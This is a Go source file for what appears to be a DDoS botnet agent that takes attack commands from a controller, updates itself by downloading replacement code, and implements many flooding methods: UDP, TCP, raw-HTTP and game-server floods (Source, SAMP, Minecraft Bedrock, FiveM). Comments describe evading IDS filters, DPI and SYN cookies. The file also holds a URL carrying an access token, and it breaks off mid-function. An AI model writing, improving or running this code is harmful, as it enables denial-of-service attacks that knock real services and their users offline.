package main

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	utls "github.com/refraction-networking/utls"
)

const (
	AColorReset   = "\033[0m"
	AColorMagenta = "\033[35m"
	AColorRed     = "\033[31m"
	AColorGreen   = "\033[32m"
	AColorCyan    = "\033[36m"
	AColorYellow  = "\033[33m"
	AColorBold    = "\033[1m"
	AColorDim     = "\033[2m"
)

const asciiArt = AColorMagenta + `
   ______   ______  ______  ______  __  ______  ______  __  __   
  /\  ___\ /\  ___\/\  __ \/\  ___\/\ \/\  ___\/\  ___\/\ \/\ \  
  \ \  __\ \ \___  \ \ \/\ \ \ \___\ \ \ \  __\\ \  __\\ \ \_\ \ 
   \ \_\    \/\_____\ \_____\ \_____\ \_\ \_____\ \_\   \ \_____\
    \/_/     \/_____/\/_____/\/_____/\/_/\/_____/\/_/    \/_____/
` + "\n" + AColorReset

// Global session tracking to prevent overlapping attacks
var globalSessionID int32

// AttackCommand structure to receive from controller
type AttackCommand struct {
	TargetIP   string `json:"target_ip"`
	TargetPort int    `json:"target_port"`
	Threads    int    `json:"threads"`
	Duration   int    `json:"duration"`
	Method     string `json:"method"`
}

// CheckForUpdates fetches the latest source from GitHub and replaces the local file
func CheckForUpdates(githubURL string) {
	if githubURL == "" || strings.Contains(githubURL, "https://raw.githubusercontent.com/szhubofficial/DeinVadder/refs/heads/main/bot.py?token=GHSAT0AAAAAADXR6SEYFR2M4DCPMZ7KYN7Q2NS2JZQ") {
		return
	}

	fmt.Printf("%s[*] Checking for updates from GitHub...%s\n", AColorCyan, AColorReset)

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(githubURL)
	if err != nil {
		fmt.Printf("%s[!] Failed to check for updates: %v%s\n", AColorRed, err, AColorReset)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		fmt.Printf("%s[!] Update check failed (Status: %d)%s\n", AColorRed, resp.StatusCode, AColorReset)
		return
	}

	newSource, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("%s[!] Failed to read update content: %v%s\n", AColorRed, err, AColorReset)
		return
	}

	// Compare with current file
	currentSource, err := os.ReadFile("agent.go")
	if err == nil && string(currentSource) == string(newSource) {
		fmt.Printf("%s[+] Agent is already up to date.%s\n", AColorGreen, AColorReset)
		return
	}

	// Backup and update
	err = os.WriteFile("agent.go", newSource, 0644)
	if err != nil {
		fmt.Printf("%s[!] Failed to update agent.go: %v%s\n", AColorRed, err, AColorReset)
		return
	}

	fmt.Printf("%s[+] Update successful! Please restart the agent to apply changes.%s\n", AColorGreen, AColorReset)
	os.Exit(0)
}

// AUdpFlood implements high-performance UDP flooding
func AUdpFlood(IP, PORT string, SECONDS int, SIZE int, sessionID int32) {
	runtime.GOMAXPROCS(runtime.NumCPU())

	if SIZE <= 0 {
		SIZE = 65000 // JUMBO FRAMES: Maximum GB/s throughput by pushing max fragmented packets
	}

	fmt.Printf("[%s] UDP Flood started: %s:%s for %ds (%d bytes) [SESSION %d]\n",
		time.Now().Format("15:04:05"), IP, PORT, SECONDS, SIZE, sessionID)

	var ppsCounter int64 = 0

	payload := make([]byte, SIZE)
	rand.Read(payload)

	raddr, err := net.ResolveUDPAddr("udp4", net.JoinHostPort(IP, PORT))
	if err != nil {
		fmt.Printf("[!] Error resolving address: %v\n", err)
		return
	}

	// Optimized concurrency settings
	// Ultimate Extreme V5 Scaling - Optimized for Stability & Constant Power
	workers := runtime.NumCPU() * 16
	if workers < 64 {
		workers = 64
	} else if workers > 256 {
		workers = 256 // Balanced for high GB/s payload (65k)
	}
	const batch = 1000 // Smaller batch for massive 65k packets to prevent buffer overflow
	const rotateEvery = 2000000 // LAZY ROTATION: Fewer dial syscalls = more constant power

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			
			var conn *net.UDPConn
			var err error
			reconnect := func() {
				if conn != nil {
					conn.Close()
				}
				conn, err = net.DialUDP("udp4", nil, raddr)
				if err == nil {
					conn.SetWriteBuffer(64 * 1024 * 1024) // EXTREME 64MB buffer for constant power
				}
			}

			reconnect()
			if conn == nil {
				return
			}
			defer conn.Close()

			workerPayload := make([]byte, SIZE)
			copy(workerPayload, payload)
			pIdx := uint32(0)

			for {
				if atomic.LoadInt32(&globalSessionID) != sessionID {
					return
				}
				
				// Jitter once per batch - manual fast jitter
				if len(workerPayload) > 16 {
					for k := 0; k < 4; k++ {
						workerPayload[len(workerPayload)-1-k] = byte(rand.Intn(256))
					}
				}

				// FAST-PATH: Tight loop
				for j := 0; j < batch; j++ {
					conn.Write(workerPayload)
				}
				atomic.AddInt64(&ppsCounter, int64(batch))
				pIdx += uint32(batch)

				// Hoisted Rotation
				if pIdx >= uint32(rotateEvery) {
					reconnect()
					if conn == nil {
						return
					}
					pIdx = 0
				}
			}
		}()
	}

	// Live stats display
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				if atomic.LoadInt32(&globalSessionID) != sessionID {
					return
				}
				pps := atomic.SwapInt64(&ppsCounter, 0)
				gbps := float64(pps) * float64(SIZE) * 8 / 1e9
				fmt.Printf("[%s] PPS: %d (%.1f kpps) | %.2f Gbit/s\n",
					time.Now().Format("15:04:05"), pps, float64(pps)/1000.0, gbps)
			}
		}
	}()

	time.AfterFunc(time.Duration(SECONDS)*time.Second, func() {
		atomic.CompareAndSwapInt32(&globalSessionID, sessionID, sessionID+1)
	})

	wg.Wait()

	// Cleanup - connections are closed by individual goroutines now
	fmt.Printf("[%s] UDP Flood finished.\n", time.Now().Format("15:04:05"))
}

// AMtuFlood implements high-PPS UDP flooding using MTU-optimized packets (no fragmentation)
func AMtuFlood(IP, PORT string, SECONDS int, sessionID int32) {
	runtime.GOMAXPROCS(runtime.NumCPU())
	const SIZE = 1450 // Standard MTU size for zero-fragmentation bandwidth

	fmt.Printf("[%s] MTU Flood started: %s:%s for %ds [SESSION %d]\n",
		time.Now().Format("15:04:05"), IP, PORT, SECONDS, sessionID)

	var ppsCounter int64 = 0
	payload := make([]byte, SIZE)
	rand.Read(payload)

	raddr, err := net.ResolveUDPAddr("udp4", net.JoinHostPort(IP, PORT))
	if err != nil {
		return
	}

	workers := runtime.NumCPU() * 16
	if workers < 64 {
		workers = 64
	} else if workers > 256 {
		workers = 256
	}
	const batch = 5000 
	const rotateEvery = 1000000

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			var conn *net.UDPConn
			var err error
			reconnect := func() {
				if conn != nil {
					conn.Close()
				}
				conn, err = net.DialUDP("udp4", nil, raddr)
				if err == nil {
					conn.SetWriteBuffer(16 * 1024 * 1024)
				}
			}
			reconnect()
			if conn == nil {
				return
			}
			defer conn.Close()

			workerPayload := make([]byte, SIZE)
			copy(workerPayload, payload)
			pIdx := uint32(0)

			for {
				if atomic.LoadInt32(&globalSessionID) != sessionID {
					return
				}
				for k := 0; k < 4; k++ {
					workerPayload[SIZE-1-k] = byte(rand.Intn(256))
				}
				for j := 0; j < batch; j++ {
					conn.Write(workerPayload)
				}
				atomic.AddInt64(&ppsCounter, int64(batch))
				pIdx += uint32(batch)
				if pIdx >= uint32(rotateEvery) {
					reconnect()
					if conn == nil {
						return
					}
					pIdx = 0
				}
			}
		}()
	}

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				if atomic.LoadInt32(&globalSessionID) != sessionID {
					return
				}
				pps := atomic.SwapInt64(&ppsCounter, 0)
				fmt.Printf("[%s] MTU-FLOOD: %d PPS\n", time.Now().Format("15:04:05"), pps)
			}
		}
	}()

	time.AfterFunc(time.Duration(SECONDS)*time.Second, func() {
		atomic.CompareAndSwapInt32(&globalSessionID, sessionID, sessionID+1)
	})
	wg.Wait()
}

// AUdpBypass uses a wide array of protocol-mimicking payloads for advanced filter evasion
func AUdpBypass(IP, PORT string, SECONDS int, sessionID int32) {
	runtime.GOMAXPROCS(runtime.NumCPU())

	fmt.Printf("[%s] ADVANCED UDP Bypass started: %s:%s for %ds [SESSION %d]\n",
		time.Now().Format("15:04:05"), IP, PORT, SECONDS, sessionID)

	var ppsCounter int64 = 0

	// Expanded bypass payloads: VSE, DNS, NTP, STUN, SNMP, and fragmented simulation
	const variants = 32
	payloads := make([][]byte, variants)
	basePayloads := [][]byte{
		[]byte("\xff\xff\xff\xffTSource Engine Query\x00"),                                                     // VSE
		[]byte("\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01"), // DNS
		[]byte("\x17\x00\x03\x2a\x00\x00\x00\x00"),                                                             // NTP
		[]byte("\x00\x01\x00\x08\x21\x12\xa4\x42"),                                                             // STUN
		[]byte("\x30\x26\x02\x01\x01\x04\x06public\xa0\x19\x02\x01\x00\x02\x01\x00\x02\x01\x00\x30\x0e\x30\x0c\x06\x08\x2b\x06\x01\x02\x01\x01\x01\x00\x05\x00"), // SNMP
	}

	for i := 0; i < variants; i++ {
		base := basePayloads[i%len(basePayloads)]
		// High GB/s focus: Pad to near MTU (1300-1450 bytes)
		size := 1300 + rand.Intn(150)
		p := make([]byte, size)
		copy(p, base)
		if len(p) > len(base) {
			rand.Read(p[len(base):])
		}
		payloads[i] = p
	}

	raddr, err := net.ResolveUDPAddr("udp4", net.JoinHostPort(IP, PORT))
	if err != nil {
		fmt.Printf("[!] Error resolving address: %v\n", err)
		return
	}

	// Extreme settings for bypass
	workers := runtime.NumCPU() * 32
	if workers < 256 {
		workers = 256
	}
	const batchSize = 10000
	const rotateEvery = 50000

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			var conn *net.UDPConn
			var err error
			reconnect := func() {
				for {
					if atomic.LoadInt32(&globalSessionID) != sessionID {
						return
					}
					if conn != nil {
						conn.Close()
					}
					conn, err = net.DialUDP("udp4", nil, raddr)
					if err == nil {
						conn.SetWriteBuffer(2 * 1024 * 1024)
						return
					}
					time.Sleep(10 * time.Millisecond)
				}
			}
			reconnect()
			if atomic.LoadInt32(&globalSessionID) != sessionID {
				return
			}
			pIdx := rand.Intn(variants)
			totalSent := 0
			for {
				if atomic.LoadInt32(&globalSessionID) != sessionID {
					if conn != nil {
						conn.Close()
					}
					return
				}
				// Jitter: Modify a few bytes of the payload
				if len(payloads[pIdx]) > 16 {
					rand.Read(payloads[pIdx][len(payloads[pIdx])-16:])
				}

				for j := 0; j < batchSize; j++ {
					_, err = conn.Write(payloads[pIdx])
					if err != nil {
						reconnect()
						if atomic.LoadInt32(&globalSessionID) != sessionID {
							return
						}
					}
					pIdx = (pIdx + 1) % variants
					totalSent++
					if totalSent >= rotateEvery {
						reconnect()
						if atomic.LoadInt32(&globalSessionID) != sessionID {
							return
						}
						totalSent = 0
					}
				}
				atomic.AddInt64(&ppsCounter, int64(batchSize))
			}
		}()
	}

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				if atomic.LoadInt32(&globalSessionID) != sessionID {
					return
				}
				pps := atomic.SwapInt64(&ppsCounter, 0)
				// Calculate GB/s for bypass
				gbps := float64(pps) * 1350 * 8 / 1e9 // Avg size 1350
				fmt.Printf("[%s] ADV-BYPASS Stats: %d PPS | %.2f Gbit/s\n",
					time.Now().Format("15:04:05"), pps, gbps)
			}
		}
	}()

	time.AfterFunc(time.Duration(SECONDS)*time.Second, func() {
		atomic.CompareAndSwapInt32(&globalSessionID, sessionID, sessionID+1)
	})

	wg.Wait()

	// Cleanup - connections are closed by individual goroutines now
	fmt.Printf("[%s] ADV UDP Bypass finished.\n", time.Now().Format("15:04:05"))
}

// APpsBypass Extreme v4: Target 5.36+ MPPS with Zero-Branch Loops & Bitwise Indexing
func APpsBypass(IP, PORT string, SECONDS int, sessionID int32) {
	runtime.GOMAXPROCS(runtime.NumCPU())

	fmt.Printf("[%s] PPS Bypass v4 ULTIMATE started: %s:%s for %ds [SESSION %d]\n",
		time.Now().Format("15:04:05"), IP, PORT, SECONDS, sessionID)

	var ppsCounter int64 = 0

	raddr, err := net.ResolveUDPAddr("udp4", net.JoinHostPort(IP, PORT))
	if err != nil {
		fmt.Printf("[!] Error resolving address: %v\n", err)
		return
	}


	// ZERO-INDIRECTION PPS (V6 Scaling)
	workers := runtime.NumCPU() * 32
	if workers < 128 {
		workers = 128
	} else if workers > 512 {
		workers = 512
	}
	const batchSize = 50000 
	const rotateEvery = 2000000 

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			
			var conn *net.UDPConn
			var err error
			reconnect := func() {
				if conn != nil {
					conn.Close()
				}
				conn, err = net.DialUDP("udp4", nil, raddr)
				if err == nil {
					conn.SetWriteBuffer(32 * 1024 * 1024) // MAX 32MB BUFFER
				}
			}

			reconnect()
			if conn == nil {
				return
			}
			defer conn.Close()

			// ZERO-INDIRECTION: Single pre-allocated buffer used by the worker
			workerPayload := []byte{0x00, 0x00}
			rand.Read(workerPayload)
			pTotal := uint32(0)
			
			for {
				if atomic.LoadInt32(&globalSessionID) != sessionID {
					return
				}

				// ULTIMATE FAST-PATH: No array lookups, no indirections
				for j := 0; j < batchSize; j++ {
					conn.Write(workerPayload)
				}
				atomic.AddInt64(&ppsCounter, int64(batchSize))
				pTotal += uint32(batchSize)

				// SHIFTED ROTATION
				if pTotal >= uint32(rotateEvery) {
					reconnect()
					if conn == nil {
						return
					}
					pTotal = 0
				}
			}
		}()
	}

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				if atomic.LoadInt32(&globalSessionID) != sessionID {
					return
				}
				pps := atomic.SwapInt64(&ppsCounter, 0)
				fmt.Printf("[%s] PPS-ULTIMATE-V4: %d PPS (%.2f MPPS)\n",
					time.Now().Format("15:04:05"), pps, float64(pps)/1e6)
			}
		}
	}()

	time.AfterFunc(time.Duration(SECONDS)*time.Second, func() {
		atomic.CompareAndSwapInt32(&globalSessionID, sessionID, sessionID+1)
	})

	wg.Wait()
	fmt.Printf("[%s] Extreme PPS Bypass finished.\n", time.Now().Format("15:04:05"))
}

// AGbpBypass optimizes for massive bandwidth (Gbit/s)
func AGbpBypass(IP, PORT string, SECONDS int, sessionID int32) {
	runtime.GOMAXPROCS(runtime.NumCPU())

	fmt.Printf("[%s] GBP Bypass started: %s:%s for %ds [SESSION %d]\n",
		time.Now().Format("15:04:05"), IP, PORT, SECONDS, sessionID)

	var ppsCounter int64 = 0

	raddr, err := net.ResolveUDPAddr("udp4", net.JoinHostPort(IP, PORT))
	if err != nil {
		fmt.Printf("[!] Error resolving address: %v\n", err)
		return
	}

	// Large payloads (1350 bytes) with masked protocol headers to bypass IDSs
	const payloadSize = 1350
	const variants = 16
	payloads := make([][]byte, variants)
	for i := 0; i < variants; i++ {
		p := make([]byte, payloadSize)
		rand.Read(p)
		// Inject some protocol signatures
		if i%3 == 0 {
			copy(p[0:10], []byte("\xff\xff\xff\xffTSource"))
		} else if i%3 == 1 {
			copy(p[0:12], []byte("\x00\x00\x01\x00\x00\x01\x03www"))
		}
		payloads[i] = p
	}

	// Optimized for Constant Power & Filter Evasion
	workers := runtime.NumCPU() * 32
	if workers < 128 {
		workers = 128
	} else if workers > 512 {
		workers = 512
	}
	const batchSize = 10000
	const rotateEvery = 500000

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			var conn *net.UDPConn
			var err error
			reconnect := func() {
				for {
					if atomic.LoadInt32(&globalSessionID) != sessionID {
						return
					}
					if conn != nil {
						conn.Close()
					}
					conn, err = net.DialUDP("udp4", nil, raddr)
					if err == nil {
						conn.SetWriteBuffer(8 * 1024 * 1014) // 8MB
						return
					}
					time.Sleep(10 * time.Millisecond)
				}
			}
			reconnect()
			if atomic.LoadInt32(&globalSessionID) != sessionID {
				return
			}
			pIdx := uint32(rand.Intn(variants))
			
			for {
				if atomic.LoadInt32(&globalSessionID) != sessionID {
					if conn != nil {
						conn.Close()
					}
					return
				}

				// Jitter between batches
				if len(payloads[pIdx%uint32(variants)]) > 16 {
					rand.Read(payloads[pIdx%uint32(variants)][len(payloads[pIdx%uint32(variants)])-16:])
				}

				// FAST-PATH: Tight loop
				for j := 0; j < batchSize; j++ {
					_, err = conn.Write(payloads[pIdx%uint32(variants)])
					pIdx++
				}
				atomic.AddInt64(&ppsCounter, int64(batchSize))

				// SHIFTED ROTATION
				if pIdx % rotateEvery < uint32(batchSize) {
					reconnect()
					if atomic.LoadInt32(&globalSessionID) != sessionID {
						return
					}
				}
			}
		}()
	}

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				if atomic.LoadInt32(&globalSessionID) != sessionID {
					return
				}
				pps := atomic.SwapInt64(&ppsCounter, 0)
				gbps := float64(pps) * float64(payloadSize) * 8 / 1e9
				fmt.Printf("[%s] GBP-BYPASS: %d PPS | %.2f Gbit/s\n",
					time.Now().Format("15:04:05"), pps, gbps)
			}
		}
	}()

	time.AfterFunc(time.Duration(SECONDS)*time.Second, func() {
		atomic.CompareAndSwapInt32(&globalSessionID, sessionID, sessionID+1)
	})

	wg.Wait()
	fmt.Printf("[%s] GB/s Bypass finished.\n", time.Now().Format("15:04:05"))
}

// ATcpFlood implements ultra-high intensity TCP connection spamming
func ATcpFlood(IP, PORT string, SECONDS int, sessionID int32) {
	runtime.GOMAXPROCS(runtime.NumCPU())

	fmt.Printf("[%s] TCP Flood ULTIMATE started: %s:%s for %ds [SESSION %d]\n",
		time.Now().Format("15:04:05"), IP, PORT, SECONDS, sessionID)

	var connCounter int64 = 0

	target := net.JoinHostPort(IP, PORT)
	payload := make([]byte, 1460) // Standard MTU-sized payload
	rand.Read(payload)

	// Ultimate TCP Spam
	workers := 1024
	if runtime.NumCPU() > 16 {
		workers = runtime.NumCPU() * 64
	}

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			
			// Full-State TCP Bypass: Establish real connections to bypass SYN cookies
			// and stateful inspection, then push HTTP-like garbage.
			for {
				if atomic.LoadInt32(&globalSessionID) != sessionID {
					return
				}
				
				// Dial with timeout
				conn, err := net.DialTimeout("tcp", target, 3*time.Second)
				if err == nil {
					conn.SetDeadline(time.Now().Add(10 * time.Second))
					
					// Push random HTTP-like garbage to trick DPI
					methods := []string{"GET ", "POST ", "HEAD ", "OPTIONS "}
					method := methods[rand.Intn(len(methods))]
					
					path := make([]byte, 16+rand.Intn(32))
					rand.Read(path)
					
					fakeHttpHeader := fmt.Sprintf("%s/%x HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n", method, path, IP)
					conn.Write([]byte(fakeHttpHeader))
					
					// Keep connection alive and bleed it with random chunks
					for j := 0; j < 5; j++ {
						if atomic.LoadInt32(&globalSessionID) != sessionID {
							break
						}
						writeSize := 64 + rand.Intn(512)
						if writeSize > len(payload) {
							writeSize = len(payload)
						}
						// Artificial delay simulating slow client
						time.Sleep(time.Duration(rand.Intn(50)) * time.Millisecond)
						_, err := conn.Write(payload[:writeSize])
						if err != nil {
							break
						}
					}
					
					conn.Close()
					atomic.AddInt64(&connCounter, 1)
				} else {
					time.Sleep(1 * time.Millisecond)
				}
			}
		}()
	}

	// Live stats display
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				if atomic.LoadInt32(&globalSessionID) != sessionID {
					return
				}
				conns := atomic.SwapInt64(&connCounter, 0)
				fmt.Printf("[%s] TCP CONNS: %d/s\n", time.Now().Format("15:04:05"), conns)
			}
		}
	}()

	time.AfterFunc(time.Duration(SECONDS)*time.Second, func() {
		atomic.CompareAndSwapInt32(&globalSessionID, sessionID, sessionID+1)
	})

	wg.Wait()
	fmt.Printf("[%s] TCP Flood finished.\n", time.Now().Format("15:04:05"))
}

// AHexBypass rotates through high-impact hex signatures for various protocols
func AHexBypass(IP, PORT string, SECONDS int, sessionID int32) {
	runtime.GOMAXPROCS(runtime.NumCPU())

	fmt.Printf("[%s] HEX-BYPASS Universal started: %s:%s for %ds [SESSION %d]\n",
		time.Now().Format("15:04:05"), IP, PORT, SECONDS, sessionID)

	var ppsCounter int64 = 0

	raddr, err := net.ResolveUDPAddr("udp4", net.JoinHostPort(IP, PORT))
	if err != nil {
		return
	}

	// Collection of "Hex-God" signatures
	signatures := [][]byte{
		[]byte("\xff\xff\xff\xffTSource Engine Query\x00"),                                                     // Source
		[]byte("SAMP\x01\x02\x03\x04\x05\x06i"),                                                                 // SAMP Info
		[]byte("SAMP\x01\x02\x03\x04\x05\x06p"),                                                                 // SAMP Players
		[]byte("\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78"), // MC Bedrock
		[]byte("\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02"),                                         // TS3 / RakNet
		[]byte("\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01"), // DNS Fake
	}

	workers := runtime.NumCPU() * 32
	if workers < 128 {
		workers = 128
	} else if workers > 512 {
		workers = 512
	}
	const batchSize = 10000
	const rotateEvery = 500000

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			var conn *net.UDPConn
			var err error
			reconnect := func() {
				if conn != nil {
					conn.Close()
				}
				conn, err = net.DialUDP("udp4", nil, raddr)
				if err == nil {
					conn.SetWriteBuffer(16 * 1024 * 1024)
				}
			}
			reconnect()
			if conn == nil {
				return
			}
			defer conn.Close()

			m := len(signatures)
			pIdx := uint32(rand.Intn(m))
			
			// ZERO-ALLOCATION: Pre-allocated packet buffer for the worker
			packetBuffer := make([]byte, 256)

			for {
				if atomic.LoadInt32(&globalSessionID) != sessionID {
					return
				}

				// Select base signature and prepare packet
				base := signatures[pIdx%uint32(m)]
				packetLen := len(base) + 64
				copy(packetBuffer, base)
				
				// Jitter only the padding part
				for k := 0; k < 8; k++ {
					packetBuffer[len(base)+k] = byte(rand.Intn(256))
				}

				// FAST-PATH: No allocations, no appends
				for j := 0; j < batchSize; j++ {
					conn.Write(packetBuffer[:packetLen])
				}
				atomic.AddInt64(&ppsCounter, int64(batchSize))
				pIdx++

				// HOISTED ROTATION
				if pIdx % rotateEvery < uint32(batchSize) {
					reconnect()
					if conn == nil {
						return
					}
				}
			}
		}()
	}

	// Stats display
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				if atomic.LoadInt32(&globalSessionID) != sessionID {
					return
				}
				pps := atomic.SwapInt64(&ppsCounter, 0)
				fmt.Printf("[%s] HEX-BYPASS: %d PPS\n", time.Now().Format("15:04:05"), pps)
			}
		}
	}()

	time.AfterFunc(time.Duration(SECONDS)*time.Second, func() {
		atomic.CompareAndSwapInt32(&globalSessionID, sessionID, sessionID+1)
	})

	wg.Wait()
}

// AFivemFlood mimics FiveM OOB packets and floods JSON endpoints for raw power
func AFivemFlood(IP, PORT string, SECONDS int, sessionID int32) {
	runtime.GOMAXPROCS(runtime.NumCPU())

	fmt.Printf("[%s] FiveM Raw Power started: %s:%s for %ds [SESSION %d]\n",
		time.Now().Format("15:04:05"), IP, PORT, SECONDS, sessionID)

	var ppsCounter int64 = 0
	var hpsCounter int64 = 0

	raddr, err := net.ResolveUDPAddr("udp4", net.JoinHostPort(IP, PORT))
	if err != nil {
		fmt.Printf("[!] Error resolving address: %v\n", err)
		return
	}

	// 1. Optimized UDP Vector (Hot Sockets)
	payloads := [][]byte{
		[]byte("\xff\xff\xff\xffgetinfo \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
		[]byte("\xff\xff\xff\xffgetstatus"),
		[]byte("\xff\xff\xff\xffgetchallenge 0000000000"),
		[]byte("\xff\xff\xff\xffTSource Engine Query\x00"),
	}

	udpWorkers := runtime.NumCPU() * 16
	if udpWorkers < 64 {
		udpWorkers = 64
	} else if udpWorkers > 256 {
		udpWorkers = 256
	}
	const udpBatch = 5000
	const rotateEvery = 500000

	var wg sync.WaitGroup
	for i := 0; i < udpWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			var conn *net.UDPConn
			var err error
			reconnect := func() {
				if conn != nil {
					conn.Close()
				}
				conn, err = net.DialUDP("udp4", nil, raddr)
				if err == nil {
					conn.SetWriteBuffer(8 * 1024 * 1024)
				}
			}
			reconnect()
			if conn == nil {
				return
			}
			defer conn.Close()

			m := len(payloads)
			pIdx := uint32(rand.Intn(m))
			for {
				if atomic.LoadInt32(&globalSessionID) != sessionID {
					return
				}
				
				// Jitter: Modify a few bytes between batches
				currentPayload := payloads[pIdx%uint32(m)]
				currentPayload[0] = byte(rand.Intn(256))
				currentPayload[1] = byte(rand.Intn(256))

				// FAST-PATH: Inner loops
				for j := 0; j < udpBatch; j++ {
					conn.Write(currentPayload)
				}
				atomic.AddInt64(&ppsCounter, int64(udpBatch))
				pIdx += uint32(udpBatch)

				// HOISTED ROTATION
				if pIdx >= uint32(rotateEvery) {
					reconnect()
					if conn == nil {
						return
					}
					pIdx = 0
				}
			}
		}()
	}

	// 2. Optimized HTTP Vector (JSON endpoints)
	targetBase := fmt.Sprintf("http://%s:%s", IP, PORT)
	endpoints := []string{"/players.json", "/info.json"}
	
	httpWorkers := 64
	if runtime.NumCPU() > 16 {
		httpWorkers = 128
	}

	transport := &http.Transport{
		MaxIdleConns:        1000,
		MaxIdleConnsPerHost: 1000,
		DisableCompression:  true,
	}
	client := &http.Client{
		Transport: transport,
		Timeout:   5 * time.Second,
	}

	for i := 0; i < httpWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				if atomic.LoadInt32(&globalSessionID) != sessionID {
					return
				}
				url := targetBase + endpoints[rand.Intn(len(endpoints))]
				resp, err := client.Get(url)
				if err == nil {
					io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
					atomic.AddInt64(&hpsCounter, 1)
				}
			}
		}()
	}

	// Stats logger
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				if atomic.LoadInt32(&globalSessionID) != sessionID {
					return
				}
				pps := atomic.SwapInt64(&ppsCounter, 0)
				hps := atomic.SwapInt64(&hpsCounter, 0)
				fmt.Printf("[%s] FIVEM POWER: %d PPS | %d HTTP/s\n",
					time.Now().Format("15:04:05"), pps, hps)
			}
		}
	}()

	time.AfterFunc(time.Duration(SECONDS)*time.Second, func() {
		atomic.CompareAndSwapInt32(&globalSessionID, sessionID, sessionID+1)
	})

	wg.Wait()
	fmt.Printf("[%s] FiveM Raw Power finished.\n", time.Now().Format("15:04:05"))
}

var AUserAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
}

// ATcpHttpFlood mimics the user's Python script: Raw TCP + Raw HTTP string
func ATcpHttpFlood(IP, PORT string, SECONDS int, sessionID int32) {
	runtime.GOMAXPROCS(runtime.NumCPU())
	target := net.JoinHostPort(IP, PORT)

	fmt.Printf("[%s] RAW-HTTP Flood started: %s for %ds [SESSION %d]\n",
		time.Now().Format("15:04:05"), target, SECONDS, sessionID)

	var reqCounter int64 = 0
	
	// Pre-build the raw HTTP request string
	rawRequest := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\nConnection: close\r\n\r\n", 
		IP, AUserAgents[rand.Intn(len(AUserAgents))])
	rawReqBytes := []byte(rawRequest)

	// EXTREME CONCURRENCY for connection exhaustion
	workers := 4096 
	if runtime.NumCPU() > 16 {
		workers = runtime.NumCPU() * 256
	}

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				if atomic.LoadInt32(&globalSessionID) != sessionID {
					return
				}

				// Shorter timeout to prevent worker stalling
				conn, err := net.DialTimeout("tcp", target, 1*time.Second)
				if err != nil {
					// Fallback to even more aggressive dialing if target is unresponsive
					continue
				}
				
				conn.SetWriteDeadline(time.Now().Add(500 * time.Millisecond))
				conn.Write(rawReqBytes)
				conn.Close() 
				
				atomic.AddInt64(&reqCounter, 1)
			}
		}()
	}

	// Stats display
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				if atomic.LoadInt32(&globalSessionID) != sessionID {
					return
				}
				reqs := atomic.SwapInt64(&reqCounter, 0)
				fmt.Printf("[%s] RAW-HTTP: %d Requests/s\n", time.Now().Format("15:04:05"), reqs)
			}
		}
	}()

	time.AfterFunc(time.Duration(SECONDS)*time.Second, func() {
